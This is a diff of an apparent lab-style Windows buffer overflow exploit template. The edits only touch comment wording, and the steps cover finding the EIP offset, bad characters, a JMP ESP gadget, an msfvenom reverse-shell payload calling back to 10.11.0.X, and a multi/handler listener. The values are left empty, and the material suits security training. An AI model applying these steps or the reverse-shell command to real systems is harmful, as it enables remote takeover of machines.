@@ -10,12 +10,12 @@ PORT = 5555
 
 
 #step 2, find the length to hit EIP, generate length with the following
-# msf-pattern_create -l LENGTH-TO-OVERFLOW
+#msf-pattern_create -l LENGTH-TO-OVERFLOW
 #buffer += ""
 
 
-#step 3, find offset with the following
-# msf-pattern_offset -q CHARS_IN_EIP
+#step 3, find the offset with the following
+#msf-pattern_offset -q CHARS_IN_EIP
 
 
 #step 4, send extra chars to confirm if you do have control of EIP by filling it with B 
@@ -39,7 +39,7 @@ bad_char = ("")
 
 
 #step 6, find a way to jump into ESP with !mona jmp -r ESP, set it into the var below
-# remember to flip the address if coming from an x86 machine
+#remember to flip the address if coming from an x86 machine
 esp_jmp = ("")
 
 #buffer += esp_jmp
@@ -48,13 +48,13 @@ esp_jmp = ("")
 #step 7, generate shell code
 #msfvenom -p windows/shell/reverse_tcp LPORT=1337 LHOST=10.11.0.X -b '\x00' -f ruby
 #remember to insert the bad characters in the -b section
-# TAKE NOTE OF HOW BIG YOUR SHELL CODE IS
+#TAKE NOTE OF HOW BIG YOUR SHELL CODE IS
 shellcode = ()
 
 
-#step 8, generate space with metasm that is bigeer than the unpacked space of your shell code.
+#step 8, generate space with metasm that is bigger than the unpacked space of your shell code.
 #add esp, -1650 was good in this instance
-# DO NOT FLIP THIS ADDRESS!
+#DO NOT FLIP THIS ADDRESS!
 space = ("")
 #buffer += space
 
@@ -64,7 +64,7 @@ space = ("")
 #step 10, make sure to catch with a multi/handler in msfconsole
 
 
-#step 11, pack it all together like so
+#step 11, pack it all together like so:
 
 #buffer = "A"*1100
 #buffer += esp_jmp
